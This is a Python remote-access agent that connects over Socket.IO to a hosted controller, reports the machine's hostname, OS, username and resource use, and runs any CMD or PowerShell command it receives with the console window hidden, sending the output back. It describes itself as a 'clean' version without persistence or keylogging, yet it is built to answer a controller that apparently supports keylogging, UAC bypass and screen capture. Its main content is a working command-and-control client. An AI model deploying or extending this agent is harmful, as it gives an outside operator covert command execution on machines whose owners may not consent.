#!/usr/bin/env python3
"""
Pure Agent - Clean agent that connects to original controller.py
No UAC bypasses, no persistence, no privilege escalation
Compatible with existing controller.py Socket.IO events
"""

import socketio
import sys
import os
import platform
import subprocess
import threading
import time
import uuid
import psutil
import json
from datetime import datetime

# Configuration - connects to your existing controller
SERVER_URL = "https://agent-controller-backend.onrender.com"
# Or for local testing: SERVER_URL = "http://localhost:5000"

AGENT_ID = str(uuid.uuid4())

# Socket.IO client
sio = socketio.Client(
    reconnection=True,
    reconnection_attempts=0,
    reconnection_delay=5,
    reconnection_delay_max=30
)

# Agent information
AGENT_INFO = {
    'id': AGENT_ID,
    'hostname': platform.node(),
    'os': platform.system(),
    'os_version': platform.version(),
    'architecture': platform.machine(),
    'username': os.getenv('USERNAME') or os.getenv('USER'),
    'ip': 'Unknown',
    'python_version': platform.python_version(),
    'type': 'pure_agent'  # Identifier
}

def log(message):
    """Simple logging"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] {message}")

def execute_command(command):
    """Execute shell command and return output - supports both CMD and PowerShell"""
    try:
        log(f"Executing command: {command}")
        
        # Handle special commands that the original controller might send
        if command == 'start-stream' or command == 'start-screen-stream':
            return "Screen streaming not available in pure agent (no privilege escalation required)"
        elif command == 'stop-stream':
            return "Screen streaming not active"
        elif command == 'start-camera-stream':
            return "Camera streaming not available in pure agent"
        elif command == 'start-audio-stream':
            return "Audio streaming not available in pure agent"
        elif command == 'shutdown':
            log("Shutdown requested by controller")
            sio.disconnect()
            sys.exit(0)
        
        # Determine if this is a PowerShell or CMD command
        powershell_indicators = [
            'get-', 'set-', 'new-', 'remove-', 'start-', 'stop-', 'test-',
            'invoke-', 'import-', 'export-', 'select-', 'where-', 'foreach-',
            '$', '|', 'write-host', 'write-output', '.ps1'
        ]
        
        # Check if command looks like PowerShell
        command_lower = command.lower()
        is_powershell = any(indicator in command_lower for indicator in powershell_indicators)
        
        # Map common Unix/Linux commands to Windows equivalents
        command_mappings = {
            'ls': 'dir',
            'ls -la': 'dir',
            'ls -l': 'dir',
            'pwd': 'cd',
            'cat': 'type',
            'rm': 'del',
            'cp': 'copy',
            'mv': 'move',
            'clear': 'cls',
            'ps': 'tasklist',
            'kill': 'taskkill /PID',
            'grep': 'findstr',
            'which': 'where'
        }
        
        # Auto-translate common Unix commands
        original_command = command
        for unix_cmd, windows_cmd in command_mappings.items():
            if command.strip().startswith(unix_cmd):
                command = command.replace(unix_cmd, windows_cmd, 1)
                log(f"Auto-translated: '{original_command}' → '{command}'")
                break
        
        # Execute command
        if platform.system() == 'Windows':
            if is_powershell:
                # Execute via PowerShell
                ps_command = ['powershell', '-NoProfile', '-NonInteractive', '-Command', command]
                result = subprocess.run(
                    ps_command,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
                )
            else:
                # Execute via CMD
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
                )
        else:
            # Unix/Linux/Mac
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
        
        # Get output
        output = result.stdout if result.stdout else result.stderr
        if not output:
            output = "Command executed successfully (no output)"
        
        # Clean and format output
        output = clean_output(output)
        
        log(f"Command completed: {len(output)} characters")
        return output
        
    except subprocess.TimeoutExpired:
        return "Error: Command timed out after 30 seconds"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def clean_output(output):
    """Clean and format command output for better readability"""
    try:
        # Remove excessive blank lines (more than 2 consecutive)
        lines = output.split('\n')
        cleaned_lines = []
        blank_count = 0
        
        for line in lines:
            if line.strip():
                cleaned_lines.append(line)
                blank_count = 0
            else:
                blank_count += 1
                if blank_count <= 2:  # Keep max 2 blank lines
                    cleaned_lines.append(line)
        
        output = '\n'.join(cleaned_lines)
        
        # Remove excessive spaces (more than 2 consecutive spaces)
        import re
        output = re.sub(r'  +', '  ', output)
        
        # Remove trailing whitespace from each line
        lines = output.split('\n')
        output = '\n'.join(line.rstrip() for line in lines)
        
        # Remove trailing blank lines
        output = output.rstrip('\n')
        
        return output
        
    except Exception as e:
        log(f"Error cleaning output: {e}")
        return output

def get_system_info():
    """Get system information - compatible with controller.py format"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return {
            **AGENT_INFO,
            'cpu_usage': cpu_percent,
            'memory_total': memory.total,
            'memory_used': memory.used,
            'memory_percent': memory.percent,
            'disk_total': disk.total,
            'disk_used': disk.used,
            'disk_percent': disk.percent,
            'uptime': time.time() - psutil.boot_time(),
            'status': 'online'
        }
    except Exception as e:
        log(f"Error getting system info: {e}")
        return AGENT_INFO

# Socket.IO Event Handlers - Compatible with original controller.py

@sio.event
def connect():
    """Handle connection to controller"""
    log(f"✅ Connected to controller at {SERVER_URL}")
    log(f"Agent ID: {AGENT_ID}")
    log(f"Agent Type: Pure Agent (No UAC/Persistence)")
    
    # Register agent with controller using agent_connect event (controller.py expects this)
    system_info = get_system_info()
    
    registration_data = {
        'agent_id': AGENT_ID,
        'name': f'Pure-Agent-{AGENT_INFO["hostname"]}',
        'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
        'ip': 'Auto-detected',
        'capabilities': ['commands', 'system_info'],
        'cpu_usage': system_info.get('cpu_usage', 0),
        'memory_usage': system_info.get('memory_percent', 0),
        'network_usage': 0,
        'system_info': {
            'hostname': AGENT_INFO['hostname'],
            'os': AGENT_INFO['os'],
            'os_version': AGENT_INFO['os_version'],
            'architecture': AGENT_INFO['architecture'],
            'username': AGENT_INFO['username'],
            'python_version': AGENT_INFO['python_version']
        },
        'uptime': system_info.get('uptime', 0)
    }
    
    log(f"Sending agent_connect event with data: {registration_data}")
    sio.emit('agent_connect', registration_data)
    
    # Also send agent_register for compatibility
    sio.emit('agent_register', {
        'agent_id': AGENT_ID,
        'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
        'python_version': AGENT_INFO['python_version'],
        'timestamp': time.time()
    })

@sio.event
def connect_error(data):
    """Handle connection error"""
    log(f"❌ Connection error: {data}")

@sio.event
def disconnect():
    """Handle disconnection"""
    log("⚠️ Disconnected from controller")

@sio.on('command')
def on_command(data):
    """Handle command from controller - matches controller.py line 3168"""
    try:
        command = data.get('command', '')
        execution_id = data.get('execution_id', '')
        
        log(f"📨 Received 'command' event: {command} (execution_id: {execution_id})")
        
        # Execute command
        output = execute_command(command)
        
        # Send result back to controller using command_result event
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'command': command,
            'output': output,
            'success': True,
            'execution_id': execution_id,
            'timestamp': time.time()
        })
        
        log(f"✅ Sent command_result for: {command}")
        
    except Exception as e:
        log(f"❌ Error handling command: {e}")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f"Error: {str(e)}",
            'success': False,
            'timestamp': time.time()
        })

@sio.on('execute_command')
def on_execute_command(data):
    """Handle execute_command event - for UI v2.1 compatibility"""
    try:
        command = data.get('command', '')
        agent_id = data.get('agent_id', '')
        
        if agent_id and agent_id != AGENT_ID:
            return
        
        log(f"Received execute_command: {command}")
        
        # Execute command
        output = execute_command(command)
        
        # Send result back
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'command': command,
            'output': output,
            'success': True,
            'execution_time': 0,
            'timestamp': time.time()
        })
        
    except Exception as e:
        log(f"Error handling execute_command: {e}")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f"Error: {str(e)}",
            'success': False,
            'timestamp': time.time()
        })

@sio.on('get_system_info')
def on_get_system_info(data):
    """Handle system info request"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        info = get_system_info()
        sio.emit('system_info_response', {
            'agent_id': AGENT_ID,
            'info': info,
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error getting system info: {e}")

@sio.on('ping')
def on_ping(data):
    """Handle ping request from controller"""
    try:
        # Controller sends ping, we respond with pong
        # But we also send ping ourselves in heartbeat
        pass  # Already handled in heartbeat
    except Exception as e:
        log(f"Error handling ping: {e}")

@sio.on('pong')
def on_pong(data):
    """Handle pong response from controller"""
    try:
        # Controller responds to our ping with pong
        log(f"✅ Received pong from controller - Connection alive")
    except Exception as e:
        log(f"Error handling pong: {e}")

@sio.on('agent_registered')
def on_agent_registered(data):
    """Handle registration confirmation from controller"""
    try:
        log(f"✅ Agent successfully registered with controller!")
        log(f"Registration confirmed: {data}")
    except Exception as e:
        log(f"Error handling registration confirmation: {e}")

@sio.on('registration_error')
def on_registration_error(data):
    """Handle registration error from controller"""
    try:
        log(f"❌ Registration error: {data.get('message', 'Unknown error')}")
    except Exception as e:
        log(f"Error handling registration error: {e}")

@sio.on('agent_list_update')
def on_agent_list_update(data):
    """Handle agent list update from controller"""
    try:
        log(f"📋 Agent list update received - {len(data) if isinstance(data, dict) else 0} agents")
    except Exception as e:
        log(f"Error handling agent list update: {e}")

@sio.on('shutdown')
def on_shutdown(data):
    """Handle shutdown request from controller"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        log("Shutdown requested by controller")
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Pure agent shutting down...',
            'timestamp': time.time()
        })
        
        time.sleep(1)
        sio.disconnect()
        sys.exit(0)
        
    except Exception as e:
        log(f"Error during shutdown: {e}")

@sio.on('request_screenshot')
def on_request_screenshot(data):
    """Handle screenshot request - not available in pure agent"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Screenshot not available in pure agent (no screen capture libraries)',
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling screenshot: {e}")

@sio.on('start_keylogger')
def on_start_keylogger(data):
    """Handle keylogger request - not available in pure agent"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Keylogger not available in pure agent (ethical version)',
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling keylogger: {e}")

def heartbeat():
    """Send periodic heartbeat to controller"""
    while True:
        try:
            if sio.connected:
                # Send agent_heartbeat (controller.py expects this)
                sio.emit('agent_heartbeat', {
                    'agent_id': AGENT_ID,
                    'timestamp': time.time()
                })
                
                # Also send ping for keep-alive
                sio.emit('ping', {
                    'agent_id': AGENT_ID,
                    'timestamp': time.time(),
                    'uptime': time.time() - psutil.boot_time()
                })
            time.sleep(30)
        except Exception as e:
            log(f"Heartbeat error: {e}")
            time.sleep(30)

def status_update():
    """Send periodic status updates to controller"""
    while True:
        try:
            if sio.connected:
                info = get_system_info()
                
                # Send agent_telemetry (controller.py line 3499)
                sio.emit('agent_telemetry', {
                    'agent_id': AGENT_ID,
                    'cpu_usage': info.get('cpu_usage', 0),
                    'memory_usage': info.get('memory_percent', 0),
                    'network_usage': 0,
                    'uptime': info.get('uptime', 0),
                    'timestamp': time.time()
                })
                
                # Also update agent_connect to refresh status
                sio.emit('agent_connect', {
                    'agent_id': AGENT_ID,
                    'name': f'Pure-Agent-{AGENT_INFO["hostname"]}',
                    'platform': f'{AGENT_INFO["os"]} {AGENT_INFO["os_version"]}',
                    'cpu_usage': info.get('cpu_usage', 0),
                    'memory_usage': info.get('memory_percent', 0),
                    'network_usage': 0,
                    'uptime': info.get('uptime', 0)
                })
            time.sleep(60)
        except Exception as e:
            log(f"Status update error: {e}")
            time.sleep(60)

def main():
    """Main entry point"""
    log("=" * 70)
    log("Pure Agent - Connects to Original controller.py")
    log("=" * 70)
    log(f"Agent ID: {AGENT_ID}")
    log(f"Hostname: {AGENT_INFO['hostname']}")
    log(f"OS: {AGENT_INFO['os']} {AGENT_INFO['os_version']}")
    log(f"User: {AGENT_INFO['username']}")
    log(f"Server: {SERVER_URL}")
    log("=" * 70)
    log("")
    log("✅ Features Available:")
    log("  ✓ Command execution")
    log("  ✓ System information")
    log("  ✓ Process listing (via commands)")
    log("  ✓ File browsing (via commands)")
    log("  ✓ Network info (via commands)")
    log("")
    log("❌ Features NOT Available (No Privilege Escalation):")
    log("  ✗ Screen streaming")
    log("  ✗ Camera streaming")
    log("  ✗ Audio streaming")
    log("  ✗ Keylogging")
    log("  ✗ UAC bypasses")
    log("  ✗ Persistence")
    log("  ✗ Registry modifications")
    log("")
    log("This is a CLEAN agent - No UAC, No Persistence, No Escalation")
    log("Compatible with original controller.py Socket.IO events")
    log("")
    log("=" * 70)
    
    # Start background threads
    heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)
    heartbeat_thread.start()
    
    status_thread = threading.Thread(target=status_update, daemon=True)
    status_thread.start()
    
    # Connect to controller
    while True:
        try:
            log(f"Connecting to controller at {SERVER_URL}...")
            sio.connect(SERVER_URL, transports=['websocket', 'polling'])
            
            log("✅ Successfully connected!")
            log("Waiting for commands from controller...")
            log("The agent will appear in the controller UI")
            log("")
            
            # Keep connection alive
            sio.wait()
            
        except KeyboardInterrupt:
            log("\nShutting down...")
            break
        except Exception as e:
            log(f"❌ Connection error: {e}")
            log("Retrying in 10 seconds...")
            time.sleep(10)
    
    # Cleanup
    if sio.connected:
        sio.disconnect()
    
    log("Agent stopped - No cleanup needed (no persistence)")
    log("No registry entries, no scheduled tasks, no files left behind")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nAgent stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"\nFatal error: {e}")
        sys.exit(1)
